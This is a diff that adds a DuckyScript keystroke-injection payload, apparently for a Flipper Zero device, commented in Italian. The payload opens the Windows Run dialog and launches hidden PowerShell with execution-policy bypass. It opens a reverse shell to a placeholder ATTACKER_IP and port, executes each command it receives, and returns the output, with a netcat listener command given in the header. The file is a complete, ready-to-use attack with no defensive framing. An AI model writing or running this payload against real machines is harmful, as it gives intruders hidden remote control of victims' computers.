@@ -1,0 +1,19 @@
+REM ============================================================
+REM Title:    PowerShell Reverse Shell
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~5 secondi
+REM Detect:   Alto - PowerShell network connection
+REM Desc:     Apre una reverse shell PowerShell verso il C2.
+REM           Listener: nc -lvnp ATTACKER_PORT
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT prima dell'uso
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+ENTER
